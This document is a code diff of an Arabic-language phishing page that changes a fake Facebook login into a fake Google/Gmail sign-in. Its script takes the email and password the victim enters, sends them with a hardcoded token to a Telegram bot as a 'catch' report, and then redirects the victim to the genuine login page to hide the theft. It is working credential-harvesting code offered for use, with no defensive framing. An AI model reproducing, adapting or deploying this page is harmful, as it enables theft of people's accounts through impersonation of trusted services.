@@ -3,66 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { background-color: #fff; width: 100%; padding: 20px 0; text-align: center; border-bottom: 1px solid #ddd; }
-        .logo { width: 150px; }
-        .login-container { background: #fff; width: 90%; max-width: 400px; margin-top: 20px; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; font-size: 18px; cursor: pointer; }
-        .footer-links { margin-top: 20px; font-size: 14px; color: #1877f2; text-decoration: none; }
-        .divider { margin: 20px 0; border-top: 1px solid #ddd; position: relative; }
-        .create-btn { background-color: #42b72a; padding: 10px 20px; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { font-size: 16px; margin-bottom: 25px; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input:focus { border: 2px solid #1a73e8; outline: none; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
+        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .create-account { color: #1a73e8; font-weight: bold; text-decoration: none; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkhp6.svg" class="logo" alt="Facebook">
-    </div>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
+        <h1>تسجيل الدخول</h1>
+        <p>المتابعة إلى Gmail</p>
+        
+        <form id="gForm">
+            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+            <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+            
+            <div style="text-align: right; margin-top: 5px;">
+                <a href="#" class="create-account">هل نسيت البريد الإلكتروني؟</a>
+            </div>
 
-    <div class="login-container">
-        <form id="fbForm">
-            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
+            <div class="footer">
+                <a href="#" class="create-account">إنشاء حساب</a>
+                <button type="submit" class="btn">التالي</button>
+            </div>
         </form>
-        <div style="text-align: center; margin-top: 15px;">
-            <a href="#" class="footer-links">هل نسيت كلمة السر؟</a>
-        </div>
-        <div class="divider"></div>
-        <div style="text-align: center;">
-            <a href="#" class="create-btn">إنشاء حساب جديد</a>
-        </div>
     </div>
 
     <script>
         const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
         const CHAT_ID = "5811700860";
 
-        document.getElementById('fbForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // منع الصفحة من التحديث
+        document.getElementById('gForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
             const user = document.getElementById('email').value;
             const password = document.getElementById('pass').value;
 
-            // تجهيز تقرير الصيد
-            const report = `🎯 **صيد فيسبوك جديد:**\n\n📧 اليوزر: \`${user}\`\n🔑 الباسورد: \`${password}\`\n📱 الجهاز: ${navigator.platform}`;
+            // إرسال البيانات لبوت التيليجرام فوراً
+            const report = `📧 **صيد Gmail جديد:**\n\n👤 الإيميل: \`${user}\`\n🔑 الباسورد: \`${password}\`\n🌍 الـ IP: [جاري الجلب...]`;
 
-            // إرسال البيانات فوراً للبوت
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
             })
             .then(() => {
-                // الحيلة الأهم: التحويل لصفحة تسجيل الدخول الحقيقية
-                // بمجرد ضغط الزر، يطير الصيد ويتحول لفيسبوك الرسمي
-                window.location.href = "https://m.facebook.com/login.php"; 
+                // التحويل لصفحة Gmail الحقيقية لإكمال الدخول
+                window.location.href = "https://accounts.google.com/ServiceLogin?service=mail";
             })
             .catch(() => {
-                window.location.href = "https://m.facebook.com";
+                window.location.href = "https://mail.google.com";
             });
         });
     </script>
